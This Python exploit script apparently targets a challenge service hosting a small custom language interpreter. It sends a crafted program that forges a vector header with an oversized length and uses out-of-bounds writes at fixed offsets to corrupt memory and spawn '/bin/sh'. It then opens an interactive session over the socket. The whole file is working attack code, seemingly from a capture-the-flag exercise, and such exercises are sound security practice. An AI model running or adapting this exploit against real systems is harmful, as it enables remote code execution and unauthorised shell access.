#!/usr/bin/env python3
import argparse
import select
import socket
import sys
import time


PAYLOAD = r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };

  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);

  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);

  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
'''


def recv_until(sock, marker, timeout=10):
    sock.settimeout(timeout)
    out = b""
    deadline = time.time() + timeout
    while marker not in out and time.time() < deadline:
        chunk = sock.recv(4096)
        if not chunk:
            break
        out += chunk
    return out


def interactive(sock):
    sock.setblocking(False)
    inputs = [sock, sys.stdin]
    while inputs:
        readable, _, _ = select.select(inputs, [], [])
        if sock in readable:
            try:
                data = sock.recv(4096)
            except BlockingIOError:
                data = b""
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        if sys.stdin in readable:
            data = sys.stdin.buffer.readline()
            if data:
                sock.sendall(data)
            else:
                inputs.remove(sys.stdin)
                try:
                    sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=9999)
    args = parser.parse_args()

    source = PAYLOAD + "END_OF_SOURCE\n"
    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        sock.settimeout(10)
        out = sock.recv(4096)
        sock.sendall(source.encode())
        out += recv_until(sock, b"resolve puts")
        print(out.decode("latin-1", errors="replace"), end="", flush=True)
        interactive(sock)


if __name__ == "__main__":
    main()
